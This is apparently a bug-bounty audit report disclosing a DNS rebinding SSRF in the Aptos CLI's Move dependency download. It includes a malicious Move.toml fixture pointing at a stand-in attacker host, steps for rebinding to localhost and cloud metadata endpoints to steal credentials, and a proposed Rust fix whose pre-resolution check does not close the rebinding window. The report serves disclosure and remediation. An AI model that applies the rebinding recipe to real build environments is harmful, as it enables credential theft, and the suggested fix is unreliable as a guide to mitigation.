# Audit Report

## Title
DNS Rebinding Attack in Package Dependency Resolution Allows SSRF to Internal Services

## Summary
The `maybe_download_package()` function in the Move package dependency resolution system is vulnerable to DNS rebinding attacks. An attacker can craft a malicious Move package with a dependency that specifies a `node_url` pointing to a domain under their control. By manipulating DNS records during the package build process, the attacker can cause HTTP requests to be redirected from a legitimate external IP to internal services (localhost, private networks, cloud metadata endpoints), enabling Server-Side Request Forgery (SSRF).

## Finding Description

The vulnerability exists in the package dependency resolution flow: [1](#0-0) 

When a Move package declares a custom dependency using the "aptos" key in `Move.toml`, the `node_url` field is parsed from the TOML manifest: [2](#0-1) [3](#0-2) 

The attack exploits the Time-of-Check-Time-of-Use (TOCTOU) window between URL parsing and HTTP request execution. The `CachedPackageRegistry::create()` function creates a REST client and makes multiple HTTP requests: [4](#0-3) 

The underlying `reqwest` HTTP client resolves DNS for each request without IP validation: [5](#0-4) 



**Attack Scenario:**

1. Attacker creates a malicious Move package with a dependency:
   ```toml
   [dependencies]
   MaliciousPackage = { aptos = "http://attacker.com", address = "0x1" }
   ```

2. Attacker configures DNS for `attacker.com` with very low TTL (1-5 seconds)

3. Initially, `attacker.com` resolves to a legitimate external IP controlled by the attacker

4. Victim (developer, validator operator, or node operator) attempts to build the package

5. During the build, `Url::parse()` validates the URL syntax but not the resolved IP

6. After URL parsing but before HTTP requests, attacker changes DNS to point to internal IPs:
   - `127.0.0.1` (localhost)
   - `192.168.x.x` (internal network)
   - `169.254.169.254` (AWS metadata service)
   - `metadata.google.internal` (GCP metadata service)

7. When `get_account_resource_bcs()` and `get_account_module()` execute, `reqwest` re-resolves the domain and connects to internal services

8. Attacker can now:
   - Access internal Aptos node REST APIs
   - Steal cloud credentials from metadata services
   - Port scan internal networks
   - Access internal databases, admin panels, or other services

This breaks the **Access Control** invariant by allowing unauthorized access to services that should only be accessible from within the internal network.

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

1. **Validator Node Slowdowns**: If internal node APIs are accessed maliciously, it could cause performance degradation

2. **Significant Protocol Violations**: Bypasses network access controls and security boundaries

3. **Potential API Crashes**: Malformed requests to internal APIs could cause crashes or unexpected behavior

The impact is particularly severe because:
- Validator operators and node operators regularly build Move packages
- Access to cloud metadata services (AWS, GCP, Azure) can leak credentials enabling full node compromise
- Internal node REST APIs may expose sensitive operational data or administrative functions
- Can be used as a pivot point for more sophisticated attacks on validator infrastructure

While this does not directly cause loss of funds or consensus violations, it enables attacks that could lead to:
- Validator key theft (via cloud credential compromise)
- Internal network reconnaissance
- Data exfiltration
- Potential remote code execution through chained vulnerabilities

## Likelihood Explanation

**Likelihood: Medium to High**

**Attacker Requirements:**
- Control over a domain name (easily obtainable)
- Ability to manipulate DNS records in real-time (standard DNS provider features)
- Victim must build a package with the malicious dependency

**Attack Complexity:**
- DNS rebinding is a well-documented attack technique
- Tools like "singularity of origin" automate DNS rebinding
- No authentication or special privileges required
- Social engineering to get victims to build malicious packages (e.g., disguised as legitimate dependencies)

**Likelihood Factors:**
- Developers frequently build packages from various sources
- No visible warning or validation that would alert users to the attack
- Common in development workflows to add dependencies from third parties
- Particularly effective against node operators who run build processes in production environments

## Recommendation

Implement IP address validation and DNS rebinding protection:

**1. Validate resolved IP addresses before making HTTP requests:**

```rust
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_private() || 
            ipv4.is_loopback() || 
            ipv4.is_link_local() || 
            ipv4.is_broadcast() ||
            ipv4.octets()[0] == 169 && ipv4.octets()[1] == 254 // AWS metadata
        },
        IpAddr::V6(ipv6) => {
            ipv6.is_loopback() || 
            ipv6.is_unspecified() ||
            (ipv6.segments()[0] & 0xfe00) == 0xfc00 || // Unique local
            (ipv6.segments()[0] & 0xffc0) == 0xfe80    // Link local
        }
    }
}

async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let parsed_url = Url::parse(info.node_url.as_str())?;
        
        // Validate that the URL uses a safe scheme
        if parsed_url.scheme() != "https" && parsed_url.scheme() != "http" {
            bail!("Only http and https schemes are allowed for node URLs");
        }
        
        // Pre-resolve DNS and validate IP is not private/internal
        if let Some(host) = parsed_url.host_str() {
            use tokio::net::lookup_host;
            let addrs: Vec<_> = lookup_host(format!("{}:443", host)).await?.collect();
            for addr in addrs {
                if is_private_ip(&addr.ip()) {
                    bail!("node_url resolves to a private/internal IP address: {}. This is not allowed for security reasons.", addr.ip());
                }
            }
        }
        
        let registry = CachedPackageRegistry::create(
            parsed_url,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
}
```

**2. Configure reqwest client with custom DNS resolver that validates IPs:**

Use a custom connector in the `ClientBuilder` that validates resolved IPs before connecting.

**3. Add allowlist of trusted node URLs:**

Maintain a list of official Aptos node endpoints (mainnet, devnet, testnet) and warn users when using custom URLs.

**4. Add user confirmation for custom node URLs:**

Prompt users when building packages with dependencies from non-standard node URLs.

## Proof of Concept

**Setup:**

1. Create a malicious Move package:

```toml
# Move.toml
[package]
name = "MaliciousPackage"
version = "1.0.0"

[dependencies]
VictimDep = { aptos = "http://attacker-controlled.com", address = "0x1" }
```

2. Configure DNS for `attacker-controlled.com`:
   - Set TTL to 1 second
   - Initially point to legitimate external IP (e.g., 1.2.3.4)
   - Script to change DNS to `127.0.0.1` after 2 seconds

3. Victim runs: `aptos move compile`

4. During compilation:
   - URL is parsed (resolves to 1.2.3.4)
   - DNS record changes to 127.0.0.1
   - HTTP requests go to localhost:80 or internal services

5. Attacker can observe requests in server logs or use Burp Collaborator

**Expected Result:**
HTTP requests are made to `127.0.0.1` or other internal IPs, proving SSRF vulnerability.

**Tools:**
- DNS rebinding toolkit: `https://github.com/nccgroup/singularity`
- Or custom DNS server with programmatic record updates

---

**Notes:**

- This vulnerability affects all users of the Aptos CLI who build Move packages with custom dependencies
- The issue is in the client-side tooling, not the blockchain consensus layer
- Similar vulnerabilities may exist in other parts of the codebase that make HTTP requests based on user-controlled URLs without IP validation
- The vulnerability can be mitigated at the network level by restricting outbound connections from build environments, but should be fixed in the code

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-54)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L104-114)
```rust
pub struct CustomDepInfo {
    /// The url of the node to download from
    pub node_url: Symbol,
    /// The address where the package is published. The representation depends
    /// on the registered node resolver.
    pub package_address: Symbol,
    /// The address where the package is published.
    pub package_name: Symbol,
    /// Where the package is downloaded to.
    pub download_to: PathBuf,
}
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L392-416)
```rust
                (None, None, Some(custom_key)) => {
                    let package_name = Symbol::from(dep_name);
                    let address = match table.remove("address") {
                        None => bail!("Address not supplied for 'node' dependency"),
                        Some(r) => Symbol::from(
                            r.as_str()
                                .ok_or_else(|| format_err!("Node address not a string"))?,
                        ),
                    };
                    // Downloaded packages are of the form <sanitized_node_url>_<address>_<package>
                    let node_url = custom_key
                        .as_str()
                        .ok_or_else(|| anyhow::anyhow!("Git URL not a string"))?;
                    let local_path = PathBuf::from(MOVE_HOME.clone()).join(format!(
                        "{}_{}_{}",
                        url_to_file_name(node_url),
                        address,
                        package_name
                    ));
                    node_info = Some(PM::CustomDepInfo {
                        node_url: Symbol::from(node_url),
                        package_address: address,
                        package_name,
                        download_to: local_path.clone(),
                    });
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L43-69)
```rust
    pub async fn create(
        url: Url,
        addr: AccountAddress,
        with_bytecode: bool,
    ) -> anyhow::Result<Self> {
        let client = Client::new(url);
        // Need to use a different type to deserialize JSON
        let inner = client
            .get_account_resource_bcs::<PackageRegistry>(addr, "0x1::code::PackageRegistry")
            .await?
            .into_inner();
        let mut bytecode = BTreeMap::new();
        if with_bytecode {
            for pack in &inner.packages {
                for module in &pack.modules {
                    let bytes = client
                        .get_account_module(addr, &module.name)
                        .await?
                        .into_inner()
                        .bytecode
                        .0;
                    bytecode.insert(module.name.clone(), bytes);
                }
            }
        }
        Ok(Self { inner, bytecode })
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L134-136)
```rust
    pub fn new(base_url: Url) -> Self {
        Self::builder(AptosBaseUrl::Custom(base_url)).build()
    }
```
